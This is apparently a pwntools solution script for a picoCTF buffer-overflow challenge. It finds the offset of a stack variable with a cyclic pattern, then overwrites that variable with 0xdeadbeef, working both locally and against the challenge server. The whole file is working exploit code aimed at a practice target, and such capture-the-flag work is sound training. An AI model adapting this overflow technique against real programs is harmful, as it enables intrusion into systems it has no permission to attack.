#!/bin/usr/python3
from pwn import *

context.terminal = ["tmux", "split", "-h"]
context.log_level = "debug"
elf = context.binary = ELF("./chall")
#context.delete_corefiles = True

def find_deadbeef():
	p = process("./chall")
	offset = 0x200
	payload = bytes(cyclic(offset, alphabet = "0123456789").encode())
	info("payload = ", payload)
	p.sendlineafter("What do you see?", payload)
	p.recvuntilS("code == 0x")
	tmp = p.recvuntil('\n').decode()
	# recv the deadbeef place, notice that we need to reverse it from little endian to big endian so that the offset is right
	info(tmp)
	tmp = bytes.fromhex(tmp)
	x = tmp.decode("ASCII")
	x = x[::-1]
	info(x)
	offset = cyclic_find(x, alphabet = "0123456789")
	info(offset)
	info(hex(offset)) 
	return offset

#p = process("./chall")
p = remote("mars.picoctf.net", 31890)

offset = find_deadbeef()

payload = bytes(cyclic(offset, alphabet = "0123456789").encode())
payload +=  p64(0xdeadbeef)
info("set payload")
info(payload)
p.sendlineafter("What do you see?", payload)


p.interactive()








